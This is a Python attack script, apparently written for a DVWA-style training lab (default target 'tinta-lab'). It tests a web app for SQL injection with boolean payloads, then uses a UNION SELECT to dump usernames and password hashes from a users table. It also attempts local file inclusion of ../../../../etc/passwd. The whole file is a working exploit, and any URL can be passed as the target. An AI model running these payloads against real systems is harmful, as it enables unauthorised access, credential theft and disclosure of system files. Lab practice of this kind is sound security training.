import os
import re
import sys

sys.path.insert(0, os.getcwd())

from arsenal.web.client import cere

tinta = sys.argv[1] if len(sys.argv) > 1 else "http://tinta-lab"
url = tinta + "/vulnerabilities/sqli/"


def raspuns(id_val):
    r = cere(url, params={"id": id_val, "Submit": "Submit"})
    return len(r.text), r.text


normal_len, _ = raspuns("1")
print("normal:", normal_len, "octeti")

payloads = ["1' OR '1'='1", "1' OR 1=1-- -", "1' AND '1'='2"]
for pl in payloads:
    n, _ = raspuns(pl)
    marcaj = "  <- posibil SQLi" if n > normal_len else ""
    print(repr(pl), n, marcaj)

pl = "1' UNION SELECT user, password FROM users-- -"
_, text = raspuns(pl)
hashuri = re.findall(r"[a-f0-9]{32}", text)
print("hash-uri gasite:", hashuri)

url2 = tinta + "/vulnerabilities/fi/"
r = cere(url2, params={"page": "../../../../etc/passwd"})
if "root:" in r.text:
    print("LFI confirmat")
    print("\n".join(r.text.splitlines()[:3]))
